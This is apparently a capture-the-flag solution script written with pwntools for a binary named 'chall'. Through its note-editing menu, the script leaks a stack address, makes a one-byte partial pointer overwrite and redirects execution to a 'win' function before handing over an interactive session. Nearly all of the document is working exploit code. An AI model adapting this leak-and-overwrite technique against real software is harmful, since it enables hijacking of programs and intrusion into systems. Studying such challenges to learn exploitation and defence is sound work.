#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall")
# libc = ELF("./libc", checksec=False)

context.binary = exe

def run():
    if args.LOCAL:
        p = process([exe.path])
        # gdb.attach(p, api=True, gdbscript="""b*main+192
        #            c """)
    else:
        p = remote("host", port)

    return p

def edit_note(p, offset, length, string):
    p.sendlineafter(b"6. Quit\n", b"4")
    p.sendlineafter(b"editing: ", offset)
    p.sendafter(b"overwrite: ", length + b"\n" + string)

def exploit():
    p = run()
    win = exe.symbols['win']
    edit_note(p, b'0', b'1024', b'b'*1023 + b'\n')
    p.sendlineafter(b"6. Quit\n", b"2")
    p.recvuntil(b'b\n')
    data = p.recvn(6).ljust(8, b'\x00')
    data = u64(data)
    write = data - (0x7fff80fa47c0 - 0x7fff80fa4798)
    print("data", hex(data))
    print("write", hex(write))
    edit_note(p, b'1023', b'1', b'a' + p64(write)[0:1])
    edit_note(p, b'0', b'8', p64(win) + b'\n')
    p.interactive()


if __name__ == '__main__':
    exploit()